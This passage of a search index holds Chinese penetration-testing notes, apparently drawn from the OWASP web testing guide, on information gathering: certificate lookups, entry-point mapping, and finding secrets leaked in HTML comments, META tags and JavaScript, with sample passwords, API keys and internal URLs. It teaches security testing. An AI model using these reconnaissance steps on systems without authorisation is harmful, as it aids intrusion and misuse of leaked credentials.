search","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_13","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u8bc1\u4e66\u4e0a\u7684\u901a\u7528\u540d\u79f0 (CN) \u548c\u4e3b\u9898\u5907\u7528\u540d\u79f0 (SAN) \u53ef\u80fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u540d N\u548cSAN\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u67e5\u770b\u8bc1\u4e66\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7OpenSSL\u7b49\u5176\u4ed6\u5de5\u5177\u83b7\u53d6\uff1a</p> <pre><code>$ openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#tools","title":"Tools","text":"<p>\u6c34\u6cfd nslookup\u3001dig Nessus Nikto nmap \u641c\u7d22\u5f15\u64ce</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_14","title":"\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9","text":"<p>[[\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9|\u5168\u6587]]</p> <pre><code>\u901a\u8fc7\u8bf7\u6c42\u548c\u54cd\u5e94\u5206\u6790\u786e\u5b9a\u53ef\u80fd\u7684\u5165\u53e3\u548c\u6ce8\u5165\u70b9\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5f88\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u7528\u6237\u548c\u6d4f\u89c8\u5668\u5982\u4f55\u4e0e\u4e4b\u540c\u901a\u4fe1</p> <p>\u6ce8\u610f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u9690\u85cf\u8868\u5355\u5b57\u6bb5</p> <p>\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5e94\u8be5\u8bb0\u4e0b URL\u3001\u81ea\u5b9a\u4e49\u6807\u5934\u3001\u8bf7\u6c42/\u54cd\u5e94\u6b63\u6587\u4e2d\u7684\u4efb\u4f55\u6709\u8da3\u7684\u53c2\u6570\uff0c\u5e76\u4fdd\u5b58\u5728\u7535\u5b50\u8868\u683c\u3002 \u8bf7\u6c42\u9875\u9762  \uff5c \u4ee3\u7406\u8bf7\u6c42\u7f16\u53f7 \uff5c \u6709\u8da3\u7684\u53c2\u6570 \uff5c \u8bf7\u6c42\u7c7b\u578b \uff5c</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_15","title":"\u8bf7\u6c42\u5185\u5bb9","text":"<p>\u786e\u5b9a\u5728\u4f55\u5904\u4f7f\u7528GET \u548c\u5728\u4f55\u5904\u4f7f\u7528POST \u8bc6\u522b POST \u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u53c2\u6570 \u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7279\u522b\u6ce8\u610f\u4efb\u4f55\u9690\u85cf\u53c2\u6570 \u8bc6\u522b GET \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff0c\u7279\u522b\u662f\u67e5\u8be2\u53c2\u6570 \u8bc6\u522b\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6240\u6709\u53c2\u6570 \u5728\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216 POST \u8bf7\u6c42\u4e2d\u7684\u591a\u4e2a\u53c2\u6570\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6267\u884c\u653b\u51fb\u9700\u8981\u90e8\u5206\u6216\u5168\u90e8\u53c2\u6570\u3002\u6d4b\u8bd5\u4eba\u5458\u9700\u8981\u8bc6\u522b\u6240\u6709\u53c2\u6570\uff08\u5373\u4f7f\u5df2\u7f16\u7801\u6216\u52a0\u5bc6\uff09\u5e76\u8bc6\u522b\u54ea\u4e9b\u53c2\u6570\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3002 \u8fd8\u8981\u6ce8\u610f\u901a\u5e38\u770b\u4e0d\u5230\u7684\u4efb\u4f55\u5176\u4ed6\u6216\u81ea\u5b9a\u4e49\u7c7b\u578b\u6807\u5934\uff08\u4f8b\u5982<code>debug: false</code>\uff09\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_16","title":"\u54cd\u5e94\u5185\u5bb9","text":"<ul> <li>\u786e\u5b9a\u65b0 cookie \u7684\u8bbe\u7f6e (Set-Cookie\u6807\u5934)\u3001\u4fee\u6539\u6216\u6dfb\u52a0\u4f4d\u7f6e\u3002</li> <li>\u786e\u5b9a\u5728\u6b63\u5e38\u54cd\u5e94\uff08\u5373\u672a\u4fee\u6539\u7684\u8bf7\u6c42\uff09\u671f\u95f4\u5b58\u5728\u4efb\u4f55\u91cd\u5b9a\u5411\uff083xx HTTP \u72b6\u6001\u4ee3\u7801\uff09\u3001400 \u72b6\u6001\u4ee3\u7801\uff08\u5c24\u5176\u662f 403 Forbidden\uff09\u548c 500 \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4f7f\u7528\u4efb\u4f55\u6709\u8da3\u7684\u6807\u5934\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>Server: BIG-IP</code>\u8868\u793a\u8be5\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u5e76\u4e14\u4e00\u53f0\u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4e0d\u5f97\u4e0d\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u6765\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u8d1f\u8f7d\u5e73\u8861\u7c7b\u578b\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_17","title":"\u722c\u866b","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_18","title":"\u722c\u53d6\u5e94\u7528\u6267\u884c\u8def\u5f84","text":"<p>[[\u901a\u8fc7\u5e94\u7528\u6620\u5c04\u6267\u884c\u8def\u5f84|\u5168\u6587]]</p> <pre><code>Map \u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e86\u89e3\u4e3b\u8981\u5de5\u4f5c\u6d41\u3002\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#automatic-spidering","title":"Automatic Spidering","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_19","title":"\u722c\u53d6\u5e94\u7528\u67b6\u6784","text":"<p>[[Map \u5e94\u7528\u6846\u67b6|\u5168\u6587]]</p> <pre><code>\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u548c\u4f7f\u7528\u7684\u6280\u672f\u3002\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"\u5ba1\u67e5\u7f51\u9875\u5185\u5bb9\u662f\u5426\u5b58\u5728\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_1","title":"\u6982\u62ec","text":"<p>\u7a0b\u5e8f\u5458\u5728\u4ed6\u4eec\u7684\u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u8be6\u7ec6\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u751a\u81f3\u662f\u88ab\u63a8\u8350\u7684\u3002\u4f46\u662f\uff0cHTML \u4ee3\u7801\u4e2d\u5305\u542b\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u53ef\u80fd\u4f1a\u6cc4\u9732\u6f5c\u5728\u653b\u51fb\u8005\u4e0d\u5e94\u83b7\u5f97\u7684\u5185\u90e8\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c\u8bc4\u8bba\u548c\u5143\u6570\u636e\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u4fe1\u606f\u88ab\u6cc4\u9732\u3002\u6b64\u5916\uff0c\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u91cd\u5b9a\u5411\u54cd\u5e94\u6b63\u6587\u4e2d\u6cc4\u9732\u4fe1\u606f\u3002</p> <p>\u5bf9\u4e8e\u73b0\u4ee3\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u524d\u7aef\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript \u53d8\u5f97\u8d8a\u6765\u8d8a\u6d41\u884c\u3002\u6d41\u884c\u7684\u524d\u7aef\u6784\u5efa\u6280\u672f\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript\uff0c\u5982 ReactJS\u3001AngularJS \u6216 Vue\u3002\u4e0e HTML \u4ee3\u7801\u4e2d\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u7c7b\u4f3c\uff0c\u8bb8\u591a\u7a0b\u5e8f\u5458\u4e5f\u5c06\u654f\u611f\u4fe1\u606f\u786c\u7f16\u7801\u5728\u524d\u7aef\u7684 JavaScript \u53d8\u91cf\u4e2d\u3002\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5305\u62ec\uff08\u4f46\u4e0d\u9650\u4e8e\uff09\uff1a\u79c1\u6709 API \u5bc6\u94a5\uff08_\u4f8b\u5982_\u4e0d\u53d7\u9650\u5236\u7684 Google Map API \u5bc6\u94a5\uff09\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\uff08_\u4f8b\u5982_\u5230\u9690\u85cf\u7ba1\u7406\u9875\u9762\u6216\u529f\u80fd\u7684\u8def\u7531\uff09\uff0c\u751a\u81f3\u51ed\u636e\u3002\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u53ef\u80fd\u4f1a\u4ece\u6b64\u7c7b\u524d\u7aef JavaScript \u4ee3\u7801\u4e2d\u6cc4\u9732\u3002\u5e94\u8fdb\u884c\u5ba1\u67e5\uff0c\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u6ee5\u7528\u3002</p> <p>\u5bf9\u4e8e\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u6027\u80fd\u95ee\u9898\u662f\u7a0b\u5e8f\u5458\u975e\u5e38\u5173\u5fc3\u7684\u95ee\u9898\u3002\u7a0b\u5e8f\u5458\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u4f18\u5316\u524d\u7aef\u6027\u80fd\uff0c\u5305\u62ec Syntactically Awesome Style Sheets (SASS)\u3001Sassy CSS (SCSS)\u3001webpack \u7b49\u3002\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\uff0c\u524d\u7aef\u4ee3\u7801\u6709\u65f6\u4f1a\u53d8\u5f97\u66f4\u96be\u7406\u89e3\u548c\u96be\u4ee5\u8c03\u8bd5\uff0c\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u7a0b\u5e8f\u5458\u7ecf\u5e38\u90e8\u7f72\u6e90\u6620\u5c04\u6587\u4ef6\u4ee5\u8fdb\u884c\u8c03\u8bd5\u3002\u201c\u6e90\u5730\u56fe\u201d\u662f\u4e00\u79cd\u7279\u6b8a\u6587\u4ef6\uff0c\u5b83\u5c06\u8d44\u4ea7\uff08CSS \u6216 JavaScript\uff09\u7684\u7f29\u5c0f/\u4e11\u5316\u7248\u672c\u8fde\u63a5\u5230\u539f\u59cb\u521b\u4f5c\u7248\u672c\u3002\u7a0b\u5e8f\u5458\u4ecd\u5728\u4e89\u8bba\u662f\u5426\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u5e26\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u4f46\u662f\uff0c\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u5982\u679c\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u7528\u4e8e\u8c03\u8bd5\u7684\u6587\u4ef6\u53d1\u5e03\u5230\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5c06\u4f7f\u5b83\u4eec\u7684\u6e90\u4ee3\u7801\u66f4\u5177\u53ef\u8bfb\u6027\u3002\u5b83\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u4ece\u524d\u7aef\u53d1\u73b0\u6f0f\u6d1e\u6216\u4ece\u4e2d\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c JavaScript \u4ee3\u7801\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u8c03\u8bd5\u6587\u4ef6\u4ece\u524d\u7aef\u516c\u5f00\u3002\u6839\u636e\u9879\u76ee\u7684\u4e0a\u4e0b\u6587\u548c\u654f\u611f\u6027\uff0c\u5b89\u5168\u4e13\u5bb6\u5e94\u51b3\u5b9a\u6587\u4ef6\u662f\u5426\u5e94\u5b58\u5728\u4e8e\u751f\u4ea7\u73af\u5883\u4e2d\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u3001\u5143\u6570\u636e\u548c\u91cd\u5b9a\u5411\u6b63\u6587\u4ee5\u53d1\u73b0\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u6536\u96c6 JavaScript \u6587\u4ef6\u5e76\u67e5\u770b JS \u4ee3\u7801\uff0c\u4ee5\u66f4\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u5e76\u67e5\u627e\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u786e\u5b9a\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u5176\u4ed6\u524d\u7aef\u8c03\u8bd5\u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_4","title":"\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u548c\u5143\u6570\u636e","text":"<p>\u5f00\u53d1\u4eba\u5458\u7ecf\u5e38\u4f7f\u7528 HTML \u6ce8\u91ca\u6765\u5305\u542b\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\u6709\u65f6\uff0c\u4ed6\u4eec\u4f1a\u5fd8\u8bb0\u8bc4\u8bba\u5e76\u5c06\u5176\u7559\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5bfb\u627e\u4ee5 \u5f00\u5934\u7684 HTML \u6ce8\u91ca<code>&lt;!--</code>\u3002</p> <p>\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6ce8\u91ca\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u53ef\u80fd\u662f SQL \u4ee3\u7801\u3001\u7528\u6237\u540d\u548c\u5bc6\u7801\u3001\u5185\u90e8 IP \u5730\u5740\u6216\u8c03\u8bd5\u4fe1\u606f\u3002</p> <pre><code>...\n&lt;div class=\"table2\"&gt;\n  &lt;div class=\"col1\"&gt;1&lt;/div&gt;&lt;div class=\"col2\"&gt;Mary&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;2&lt;/div&gt;&lt;div class=\"col2\"&gt;Peter&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;3&lt;/div&gt;&lt;div class=\"col2\"&gt;Joe&lt;/div&gt;\n\n&lt;!-- Query: SELECT id, name FROM app.users WHERE active='1' --&gt;\n\n&lt;/div&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>&lt;!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --&gt;\n</code></pre> <p>\u68c0\u67e5 HTML \u7248\u672c\u4fe1\u606f\u4ee5\u83b7\u53d6\u6709\u6548\u7684\u7248\u672c\u53f7\u548c\u6570\u636e\u7c7b\u578b\u5b9a\u4e49 (DTD) URL</p> <pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n</code></pre> <ul> <li><code>strict.dtd</code>\u2013 \u9ed8\u8ba4\u4e25\u683c DTD</li> <li><code>loose.dtd</code>\u2013 \u5bbd\u677e\u7684 DTD</li> <li><code>frameset.dtd</code>\u2013 \u6846\u67b6\u96c6\u6587\u6863\u7684 DTD</li> </ul> <p>\u6709\u4e9b<code>META</code>\u6807\u7b7e\u4e0d\u63d0\u4f9b\u4e3b\u52a8\u653b\u51fb\u5411\u91cf\uff0c\u800c\u662f\u5141\u8bb8\u653b\u51fb\u8005\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\uff1a</p> <pre><code>&lt;META name=\"Author\" content=\"Andrew Muller\"&gt;\n</code></pre> <p>\u4e00\u4e2a\u5e38\u89c1\u7684\uff08\u4f46\u4e0d\u7b26\u5408WCAG\uff09<code>META</code>\u6807\u7b7e\u662fRefresh\u3002</p> <pre><code>&lt;META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\"&gt;\n</code></pre> <p>\u6807\u7b7e\u7684\u4e00\u4e2a\u5e38\u89c1\u7528\u9014<code>META</code>\u662f\u6307\u5b9a\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u7528\u6765\u63d0\u9ad8\u641c\u7d22\u7ed3\u679c\u8d28\u91cf\u7684\u5173\u952e\u5b57\u3002</p> <pre><code>&lt;META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\"&gt;\n</code></pre> <p>\u867d\u7136\u5927\u591a\u6570\u7f51\u7edc\u670d\u52a1\u5668\u901a\u8fc7\u6587\u4ef6\u6765\u7ba1\u7406\u641c\u7d22\u5f15\u64ce\u7d22\u5f15<code>robots.txt</code>\uff0c\u4f46\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>META</code>\u6807\u7b7e\u6765\u7ba1\u7406\u3002\u4e0b\u9762\u7684\u6807\u7b7e\u5c06\u5efa\u8bae\u673a\u5668\u4eba\u4e0d\u8981\u7f16\u5236\u7d22\u5f15\uff0c\u4e5f\u4e0d\u8981\u8ddf\u8e2a\u5305\u542b\u8be5\u6807\u7b7e\u7684 HTML \u9875\u9762\u4e0a\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;META name=\"robots\" content=\"none\"&gt;\n</code></pre> <p>\u4e92\u8054\u7f51\u5185\u5bb9\u9009\u62e9\u5e73\u53f0 (PICS)\u548c\u7f51\u7edc\u63cf\u8ff0\u8d44\u6e90\u534f\u8bae (POWDER)\u63d0\u4f9b\u4e86\u5c06\u5143\u6570\u636e\u4e0e\u4e92\u8054\u7f51\u5185\u5bb9\u76f8\u5173\u8054\u7684\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#javascript-javascript","title":"\u8bc6\u522b JavaScript \u4ee3\u7801\u5e76\u6536\u96c6 JavaScript \u6587\u4ef6","text":"<p>\u7a0b\u5e8f\u5458\u7ecf\u5e38\u5728\u524d\u7aef\u4f7f\u7528 JavaScript \u53d8\u91cf\u5bf9\u654f\u611f\u4fe1\u606f\u8fdb\u884c\u786c\u7f16\u7801\u3002<code>&lt;script&gt;</code>\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u5e76\u5728\u548c\u6807\u8bb0\u4e4b\u95f4\u5bfb\u627e JavaScript \u4ee3\u7801<code>&lt;/script&gt;</code>\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u8bc6\u522b\u5916\u90e8 JavaScript \u6587\u4ef6\u4ee5\u5ba1\u67e5\u4ee3\u7801\uff08JavaScript \u6587\u4ef6\u7684\u6587\u4ef6\u6269\u5c55\u540d<code>.js</code>\u548c JavaScript \u6587\u4ef6\u7684\u540d\u79f0\u901a\u5e38\u653e\u5728\u6807\u7b7e\u7684<code>src</code>(source) \u5c5e\u6027\u4e2d\uff09\u3002<code>&lt;script&gt;</code></p> <p>\u68c0\u67e5 JavaScript \u4ee3\u7801\u662f\u5426\u5b58\u5728\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u4e00\u6b65\u6ee5\u7528\u6216\u64cd\u7eb5\u7cfb\u7edf\u3002\u67e5\u627e\u4ee5\u4e0b\u503c\uff1aAPI \u5bc6\u94a5\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\u6216\u51ed\u636e\u3002\u4f8b\u5982\uff1a</p> <pre><code>const myS3Credentials = {\n  accessKeyId: config('AWSS3AccessKeyID'),\n  secretAcccessKey: config('AWSS3SecretAccessKey'),\n};\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>var conString = \"tcp://postgres:1234@localhost/postgres\";\n</code></pre> <p>\u627e\u5230 API \u5bc6\u94a5\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u68c0\u67e5 API \u5bc6\u94a5\u9650\u5236\u662f\u6309\u670d\u52a1\u8bbe\u7f6e\u7684\uff0c\u8fd8\u662f\u6309 IP\u3001HTTP \u5f15\u8350\u6765\u6e90\u7f51\u5740\u3001\u5e94\u7528\u7a0b\u5e8f\u3001SDK \u7b49\u8bbe\u7f6e\u7684\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u627e\u5230 Google Map API \u5bc6\u94a5\uff0c\u4ed6\u4eec\u53ef\u4ee5\u68c0\u67e5\u6b64 API \u5bc6\u94a5\u662f\u53d7 IP \u9650\u5236\u8fd8\u662f\u4ec5\u53d7 Google Map API \u9650\u5236\u3002\u5982\u679c Google API Key \u4ec5\u6839\u636e Google Map API \u53d7\u5230\u9650\u5236\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u8be5 API Key \u67e5\u8be2\u4e0d\u53d7\u9650\u5236\u7684 Google Map API\uff0c\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5fc5\u987b\u4e3a\u6b64\u4ed8\u8d39\u3002</p> <pre><code>\n&lt;script type=\"application/json\"&gt;\n...\n{\"GOOGLE_MAP_API_KEY\":\"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\", \"RECAPTCHA_KEY\":\"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\"}\n...\n&lt;/script&gt;\n</code></pre> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u4ece JavaScript \u4ee3\u7801\u4e2d\u627e\u5230\u654f\u611f\u8def\u5f84\uff0c\u4f8b\u5982\u6307\u5411\u5185\u90e8\u6216\u9690\u85cf\u7ba1\u7406\u9875\u9762\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;script type=\"application/json\"&gt;\n...\n\"runtimeConfig\":{\"BASE_URL_VOUCHER_API\":\"https://staging-voucher.victim.net/api\", \"BASE_BACKOFFICE_API\":\"https://10.10.10.2/api\", \"ADMIN_PAGE\":\"/hidden_administrator\"}\n...\n&lt;/script&gt;\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_5","title":"\u8bc6\u522b\u6e90\u6620\u5c04\u6587\u4ef6","text":"<p>\u6e90\u6620\u5c04\u6587\u4ef6\u901a\u5e38\u4f1a\u5728 DevTools \u6253\u5f00\u65f6\u52a0\u8f7d\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728\u6bcf\u4e2a\u5916\u90e8 JavaScript 